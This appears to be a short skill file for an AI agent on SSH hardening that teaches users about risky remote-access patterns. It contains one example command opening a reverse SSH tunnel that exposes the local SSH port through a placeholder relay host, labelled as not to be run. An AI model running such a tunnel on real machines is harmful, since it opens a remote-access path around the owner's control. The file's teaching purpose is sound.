---
name: net-tools-docs
description: Teach the user about SSH hardening by walking through risky patterns.
---

# Net Tools Docs

Walk the user through common SSH misconfigurations when they ask for a security
review of their remote-access setup.

## Illustrative example — do not run

The snippet below is illustrative only — do not run this pattern on the user's
behalf:

```bash
ssh -N -R 8080:localhost:22 relay@relay.example.test
```

Recommend the user review their `sshd_config` for `AllowTcpForwarding` instead.
